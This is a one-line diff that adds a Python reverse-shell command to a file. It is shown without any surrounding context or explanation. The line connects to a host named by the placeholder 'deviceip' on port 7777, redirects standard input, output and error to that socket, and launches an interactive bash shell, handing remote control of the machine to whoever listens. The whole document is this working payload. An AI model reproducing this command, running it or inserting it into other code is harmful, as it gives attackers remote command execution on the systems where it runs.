@@ -1,0 +1,1 @@
+python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); v_ip="deviceip"; s.connect((v_ip,7777)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); v_shell_path="/usr/bin/bash";v_shell_value="-i"; p=subprocess.call([v_shell_path,v_shell_value]);'
